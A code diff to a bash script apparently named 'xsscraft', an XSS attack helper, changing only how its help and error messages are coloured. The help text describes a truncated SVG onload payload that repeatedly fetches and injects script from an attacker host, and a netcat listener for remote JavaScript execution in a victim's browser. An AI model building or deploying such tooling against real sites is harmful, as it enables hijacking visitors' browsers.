@@ -3,31 +3,31 @@
 
 function help {
     echo -n "Usage: "
-    cecho white "xsscraft "
-    cecho yellow "<OPTION>"
-    cecho white " "
-    cecho cyan "[PARAMS]"
-    cecho reset "\n\n"
-    cecho yellow "Options:"
-    cecho reset "\n"
-    cecho white "svg-js-victim"
-    cecho reset: ": <svg/onload=setInterval ... >\n"
+    printf ${cWhite}"xsscraft "${c0}
+    printf ${cYellow}"<OPTION>"${c0}
+    printf ${cWhite}" "${c0}
+    printf ${cCyan}"[PARAMS]"${c0}
+    printf ${c0}"\n\n"${c0}
+    printf ${cYellow}"Options:"${c0}
+    printf ${c0}"\n"${c0}
+    printf ${cWhite}"svg-js-victim"${c0}
+    printf ${c0}": <svg/onload=setInterval ... >\n"
     echo  "     tag that requests every minute scrit from a host"
     echo  "     and injects result as a <scrip> tag"
     echo
     echo -n "     Parameters: "
-    cecho white "xssscraft svg-js-victim "
-    cecho cyan "<HOST:PORT> <INTERVAL (ms)>"
-    cecho reset "\n\n"
+    printf ${cWhite}"xssscraft svg-js-victim "${c0}
+    printf ${cCyan}"<HOST:PORT> <INTERVAL (ms)>"${c0}
+    printf ${c0}"\n\n"${c0}
 
-    cecho white "svg-js-alert-shell"
-    cecho reset: ": netcat terminal for remote js execution\n"
+    printf ${cWhite}"svg-js-alert-shell"${c0}
+    printf ${c0}": netcat terminal for remote js execution\n"
     echo  "     Wait for TCP requests on a given port and echo the terminal input when happen"
     echo
     echo -n "     Parameters: "
-    cecho white "xssscraft svg-js-alert-shell "
-    cecho cyan "PORT"
-    cecho reset "\n"
+    printf ${cWhite}"xssscraft svg-js-alert-shell "${c0}
+    printf ${cCyan}"PORT"${c0}
+    printf ${c0}"\n"${c0}
 
     echo
     exit 1;
@@ -38,11 +38,11 @@ if [ -z $1 ] || [ "$1" == "--help" ] || [ "$1" == "help" ]; then
 elif [ "$1" == "svg-js-victim" ]; then
 
     if [ -z $2 ]; then
-        cecho red "Missing HOST:PORT"
+        printf ${cRed}"Missing HOST:PORT"${c0}
         echo
         help;
     elif [ -z $3 ]; then
-        cecho red "Missing INTERVAL"
+        printf ${cRed}"Missing INTERVAL"${c0}
         echo
         help;
     fi
@@ -52,7 +52,7 @@ elif [ "$1" == "svg-js-victim" ]; then
 elif [ "$1" == "svg-js-alert-shell" ]; then
     
     if [ -z "$2" ]; then
-        cecho red "Missing PORT"
+        printf ${cRed}"Missing PORT"${c0}
         help;
     fi
 
